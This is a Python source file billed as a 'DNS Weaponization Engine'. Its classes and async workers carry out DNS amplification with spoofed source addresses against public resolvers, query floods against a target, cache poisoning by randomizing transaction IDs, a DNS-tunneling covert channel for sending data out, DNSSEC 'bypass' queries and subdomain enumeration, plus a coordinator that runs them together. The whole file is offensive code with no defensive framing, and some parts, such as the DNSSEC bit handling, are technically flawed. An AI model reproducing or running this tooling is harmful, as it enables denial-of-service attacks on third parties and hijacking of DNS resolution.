#!/usr/bin/env python3
"""
DNS Weaponization Engine
Implements DNS amplification, query flooding, cache poisoning, and covert channel attacks
"""

import asyncio
import socket
import struct
import random
import time
import base64
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.packet import Raw

@dataclass
class DNSAttackConfig:
    """Configuration for DNS attacks"""
    target: str = "127.0.0.1"
    port: int = 53
    amplification_servers: List[str] = None
    query_types: List[str] = None
    enable_spoofing: bool = False
    spoofing_rate: float = 0.4
    cache_poisoning: bool = False
    covert_channel: bool = False
    tunnel_data: bytes = None
    max_query_rate: int = 10000

class DNSQueryTypes:
    """DNS query types for different attack scenarios"""
    
    # Standard query types
    A = 1
    NS = 2
    CNAME = 5
    SOA = 6
    PTR = 12
    MX = 15
    TXT = 16
    AAAA = 28
    SRV = 33
    ANY = 255
    
    # Extended query types for amplification
    AMPLIFICATION_TYPES = [
        ("ANY", 255),      # Maximum amplification
        ("TXT", 16),       # Large text records
        ("MX", 15),        # Mail exchange records
        ("NS", 2),         # Name server records
        ("SOA", 6),        # Start of authority
        ("SRV", 33),       # Service records
        ("AAAA", 28),      # IPv6 addresses
    ]

class DNSPayloadGenerator:
    """Generates DNS payloads for different attack scenarios"""
    
    AMPLIFICATION_DOMAINS = [
        "isc.org",           # Known for large TXT records
        "google.com",        # Large infrastructure
        "cloudflare.com",    # DNS provider
        "amazon.com",        # Large e-commerce
        "microsoft.com",     # Large tech company
        "facebook.com",      # Social media
        "wikipedia.org",     # Large content site
    ]
    
    CACHE_POISON_DOMAINS = [
        "example.com",
        "test.local",
        "internal.corp",
        "admin.local",
        "secure.internal"
    ]
    
    @staticmethod
    def create_dns_query(domain: str, query_type: int, query_id: int = None) -> bytes:
        """Create DNS query packet"""
        if query_id is None:
            query_id = random.randint(0, 65535)
        
        # DNS header
        flags = 0x0100  # Standard query with recursion desired
        header = struct.pack("!HHHHHH", query_id, flags, 1, 0, 0, 0)
        
        # Question section
        question = b""
        for part in domain.split('.'):
            question += struct.pack("!B", len(part)) + part.encode()
        question += b"\x00"  # End of domain name
        question += struct.pack("!HH", query_type, 1)  # Type and Class (IN)
        
        return header + question
    
    @staticmethod
    def create_edns0_query(domain: str, query_type: int, buffer_size: int = 4096) -> bytes:
        """Create DNS query with EDNS0 for larger responses"""
        query_id = random.randint(0, 65535)
        
        # DNS header with additional record count = 1
        flags = 0x0100
        header = struct.pack("!HHHHHH", query_id, flags, 1, 0, 0, 1)
        
        # Question section
        question = b""
        for part in domain.split('.'):
            question += struct.pack("!B", len(part)) + part.encode()
        question += b"\x00"
        question += struct.pack("!HH", query_type, 1)
        
        # EDNS0 additional record
        edns0 = b"\x00"  # Root domain
        edns0 += struct.pack("!HHIH", 41, buffer_size, 0, 0)  # OPT record
        
        return header + question + edns0
    
    @staticmethod
    def create_cache_poison_query(target_domain: str, malicious_ip: str) -> bytes:
        """Create DNS query for cache poisoning attempt"""
        query_id = random.randint(0, 65535)
        
        # Create query
        query = DNSPayloadGenerator.create_dns_query(target_domain, DNSQueryTypes.A, query_id)
        
        # Add malicious answer (for response injection)
        answer = b""
        for part in target_domain.split('.'):
            answer += struct.pack("!B", len(part)) + part.encode()
        answer += b"\x00"
        answer += struct.pack("!HHIH", 1, 1, 300, 4)  # A record, TTL=300, length=4
        answer += socket.inet_aton(malicious_ip)
        
        return query + answer
    
    @staticmethod
    def create_tunnel_query(domain: str, data: bytes, chunk_size: int = 63) -> List[bytes]:
        """Create DNS queries for data tunneling"""
        queries = []
        
        # Encode data in base32 for DNS compatibility
        encoded_data = base64.b32encode(data).decode().lower().rstrip('=')
        
        # Split into chunks that fit in DNS labels
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        for i, chunk in enumerate(chunks):
            # Create subdomain with encoded data
            tunnel_domain = f"{chunk}.{i:04d}.{domain}"
            query = DNSPayloadGenerator.create_dns_query(tunnel_domain, DNSQueryTypes.TXT)
            queries.append(query)
        
        return queries

class DNSWeaponizationEngine:
    """Advanced DNS weaponization engine"""
    
    def __init__(self, config: DNSAttackConfig = None):
        self.config = config or DNSAttackConfig()
        self.payload_gen = DNSPayloadGenerator()
        self.spoofed_ips = self._generate_spoofed_ips()
        self.stats = {
            'queries_sent': 0,
            'amplification_requests': 0,
            'cache_poison_attempts': 0,
            'tunnel_packets': 0,
            'bytes_sent': 0,
            'responses_received': 0,
            'errors': 0
        }
    
    def _generate_spoofed_ips(self) -> List[str]:
        """Generate pool of spoofed IP addresses"""
        ips = []
        for _ in range(1000):
            # Generate random IP addresses
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            ips.append(ip)
        return ips
    
    async def dns_amplification_attack(self, duration: float = 0) -> None:
        """
        DNS amplification attack using multiple servers
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Create amplification workers for each server
        servers = self.config.amplification_servers or ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
        
        for server in servers:
            for _ in range(10):  # Multiple workers per server
                task = asyncio.create_task(self._amplification_worker(server))
                tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _amplification_worker(self, dns_server: str) -> None:
        """DNS amplification worker for specific server"""
        try:
            # Create raw socket for spoofing
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            # Fallback to regular UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(100):  # Burst of queries
                    try:
                        # Select domain and query type for maximum amplification
                        domain = random.choice(self.payload_gen.AMPLIFICATION_DOMAINS)
                        query_type_name, query_type = random.choice(DNSQueryTypes.AMPLIFICATION_TYPES)
                        
                        # Create amplified query with EDNS0
                        query = self.payload_gen.create_edns0_query(domain, query_type, 4096)
                        
                        if self.config.enable_spoofing and random.random() < self.config.spoofing_rate:
                            # Create spoofed packet
                            source_ip = random.choice(self.spoofed_ips)
                            
                            # Create IP packet with spoofed source
                            ip_packet = IP(src=source_ip, dst=dns_server) / UDP(
                                sport=random.randint(1024, 65535), 
                                dport=53
                            ) / Raw(load=query)
                            
                            try:
                                sock.sendto(bytes(ip_packet), (dns_server, 0))
                            except PermissionError:
                                # Fallback: send without spoofing
                                sock.sendto(query, (dns_server, 53))
                        else:
                            # Regular query
                            sock.sendto(query, (dns_server, 53))
                        
                        self.stats['amplification_requests'] += 1
                        self.stats['queries_sent'] += 1
                        self.stats['bytes_sent'] += len(query)
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.01)
                
        finally:
            sock.close()
    
    async def dns_query_flood(self, duration: float = 0) -> None:
        """
        DNS query flooding attack
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Create query flood workers
        num_workers = min(100, self.config.max_query_rate // 100)
        for _ in range(num_workers):
            task = asyncio.create_task(self._query_flood_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _query_flood_worker(self) -> None:
        """DNS query flood worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        try:
            while True:
                for _ in range(100):  # Burst queries
                    try:
                        # Generate random query
                        domain = f"random{random.randint(1000, 9999)}.{random.choice(['com', 'net', 'org'])}"
                        query_type = random.choice([1, 2, 5, 15, 16, 28])  # Various types
                        
                        query = self.payload_gen.create_dns_query(domain, query_type)
                        
                        sock.sendto(query, (self.config.target, self.config.port))
                        
                        self.stats['queries_sent'] += 1
                        self.stats['bytes_sent'] += len(query)
                        
                    except BlockingIOError:
                        await asyncio.sleep(0.0001)
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.001)
                
        finally:
            sock.close()
    
    async def cache_poisoning_attack(self, duration: float = 0) -> None:
        """
        DNS cache poisoning attack
        Requirements: 5.1, 5.4, 5.5
        """
        if not self.config.cache_poisoning:
            return
        
        start_time = time.time()
        tasks = []
        
        # Create cache poisoning workers
        for _ in range(20):
            task = asyncio.create_task(self._cache_poison_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _cache_poison_worker(self) -> None:
        """DNS cache poisoning worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(50):  # Burst of poison attempts
                    try:
                        # Select target domain for poisoning
                        target_domain = random.choice(self.payload_gen.CACHE_POISON_DOMAINS)
                        malicious_ip = random.choice(self.spoofed_ips)
                        
                        # Create cache poisoning query
                        poison_query = self.payload_gen.create_cache_poison_query(
                            target_domain, malicious_ip
                        )
                        
                        # Send multiple queries with different transaction IDs
                        for _ in range(10):
                            # Modify transaction ID for birthday attack
                            modified_query = bytearray(poison_query)
                            modified_query[0:2] = struct.pack("!H", random.randint(0, 65535))
                            
                            sock.sendto(bytes(modified_query), (self.config.target, self.config.port))
                            
                            self.stats['cache_poison_attempts'] += 1
                            self.stats['queries_sent'] += 1
                            self.stats['bytes_sent'] += len(modified_query)
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.1)
                
        finally:
            sock.close()
    
    async def dns_tunneling_attack(self, duration: float = 0) -> None:
        """
        DNS tunneling for covert channel attacks
        Requirements: 5.1, 5.4, 5.5
        """
        if not self.config.covert_channel or not self.config.tunnel_data:
            return
        
        start_time = time.time()
        
        # Create tunnel queries
        tunnel_queries = self.payload_gen.create_tunnel_query(
            "tunnel.example.com", 
            self.config.tunnel_data
        )
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while duration == 0 or (time.time() - start_time) < duration:
                for query in tunnel_queries:
                    try:
                        sock.sendto(query, (self.config.target, self.config.port))
                        
                        self.stats['tunnel_packets'] += 1
                        self.stats['queries_sent'] += 1
                        self.stats['bytes_sent'] += len(query)
                        
                        # Wait between tunnel packets to avoid detection
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                # Repeat tunneling
                await asyncio.sleep(1.0)
                
        finally:
            sock.close()
    
    async def dnssec_bypass_attack(self, duration: float = 0) -> None:
        """
        DNSSEC bypass techniques
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while duration == 0 or (time.time() - start_time) < duration:
                for _ in range(20):
                    try:
                        # Create queries that might bypass DNSSEC validation
                        
                        # 1. Query for DNSSEC records directly
                        dnssec_types = [43, 44, 45, 46, 47, 48, 50]  # DNSSEC record types
                        query_type = random.choice(dnssec_types)
                        
                        domain = random.choice(self.payload_gen.AMPLIFICATION_DOMAINS)
                        query = self.payload_gen.create_dns_query(domain, query_type)
                        
                        sock.sendto(query, (self.config.target, self.config.port))
                        
                        # 2. Query with DO bit set (DNSSEC OK)
                        query_with_do = bytearray(query)
                        if len(query_with_do) > 11:
                            query_with_do[11] |= 0x80  # Set DO bit
                        
                        sock.sendto(bytes(query_with_do), (self.config.target, self.config.port))
                        
                        # 3. Query with CD bit set (Checking Disabled)
                        query_with_cd = bytearray(query)
                        if len(query_with_cd) > 3:
                            query_with_cd[3] |= 0x10  # Set CD bit
                        
                        sock.sendto(bytes(query_with_cd), (self.config.target, self.config.port))
                        
                        self.stats['queries_sent'] += 3
                        self.stats['bytes_sent'] += len(query) * 3
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.05)
                
        finally:
            sock.close()
    
    async def subdomain_enumeration_attack(self, duration: float = 0) -> None:
        """
        Subdomain enumeration attack
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        
        # Common subdomain prefixes
        subdomains = [
            "www", "mail", "ftp", "admin", "test", "dev", "staging", "api",
            "app", "web", "secure", "vpn", "remote", "portal", "dashboard",
            "blog", "shop", "store", "support", "help", "docs", "wiki"
        ]
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while duration == 0 or (time.time() - start_time) < duration:
                for subdomain in subdomains:
                    try:
                        # Create subdomain query
                        full_domain = f"{subdomain}.{self.config.target}"
                        query = self.payload_gen.create_dns_query(full_domain, DNSQueryTypes.A)
                        
                        sock.sendto(query, ("8.8.8.8", 53))  # Use public DNS
                        
                        self.stats['queries_sent'] += 1
                        self.stats['bytes_sent'] += len(query)
                        
                        await asyncio.sleep(0.01)
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(1.0)
                
        finally:
            sock.close()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return self.stats.copy()
    
    async def coordinated_dns_attack(self, attack_types: List[str], duration: float = 0) -> None:
        """
        Coordinate multiple DNS attack types simultaneously
        Requirements: 5.1, 5.4, 5.5
        """
        tasks = []
        
        if "amplification" in attack_types:
            tasks.append(asyncio.create_task(self.dns_amplification_attack(duration)))
        
        if "flood" in attack_types:
            tasks.append(asyncio.create_task(self.dns_query_flood(duration)))
        
        if "cache_poison" in attack_types and self.config.cache_poisoning:
            tasks.append(asyncio.create_task(self.cache_poisoning_attack(duration)))
        
        if "tunnel" in attack_types and self.config.covert_channel:
            tasks.append(asyncio.create_task(self.dns_tunneling_attack(duration)))
        
        if "dnssec_bypass" in attack_types:
            tasks.append(asyncio.create_task(self.dnssec_bypass_attack(duration)))
        
        if "subdomain_enum" in attack_types:
            tasks.append(asyncio.create_task(self.subdomain_enumeration_attack(duration)))
        
        try:
            await asyncio.gather(*tasks)
        finally:
            for task in tasks:
                if not task.done():
                    task.cancel()